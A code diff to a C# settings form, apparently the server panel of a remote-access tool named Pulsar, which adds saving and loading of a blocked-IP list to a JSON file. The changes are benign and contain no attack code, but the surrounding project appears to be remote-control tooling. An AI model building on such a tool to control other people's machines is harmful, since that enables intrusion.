@@ -9,6 +9,9 @@ using System.Net.Sockets;
 using System.Windows.Forms;
 using Pulsar.Server.DiscordRPC;
 using Pulsar.Server.TelegramSender;
+using System.Text.Json;
+using System.IO;
+using System.Collections.Generic;
 
 
 namespace Pulsar.Server.Forms
@@ -50,7 +53,25 @@ namespace Pulsar.Server.Forms
             txtNoIPPass.Text = Settings.NoIPPassword;
             chkDiscordRPC.Checked = Settings.DiscordRPC; // Will load as false by default
             _previousDiscordRPCState = chkDiscordRPC.Checked;
-            
+
+            string filePath = "blocked.json";
+            try
+            {
+                string json = File.ReadAllText(filePath);
+                var blockedIPs = JsonSerializer.Deserialize<List<string>>(json);
+                if (blockedIPs != null && blockedIPs.Count > 0)
+                {
+                    BlockedRichTB.Text = string.Join(Environment.NewLine, blockedIPs);
+                }
+                else
+                {
+                    BlockedRichTB.Text = string.Empty;
+                }
+            }
+            catch (Exception)
+            {
+
+            }
         }
 
         private ushort GetPortSafe()
@@ -142,6 +163,19 @@ namespace Pulsar.Server.Forms
             if (mainForm != null)
             {
                 mainForm.EventLogVisability();
+            }
+
+            string[] ipList = BlockedRichTB.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+            var blockedIPs = ipList.ToList();
+            string filePath = "blocked.json";
+            try
+            {
+                string json = JsonSerializer.Serialize(blockedIPs, new JsonSerializerOptions { WriteIndented = true });
+                File.WriteAllText(filePath, json);
+            }
+            catch (Exception)
+            {
+
             }
 
             this.Close();
@@ -265,7 +299,7 @@ namespace Pulsar.Server.Forms
                 );
                 MessageBox.Show("Checked And Working");
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
             }
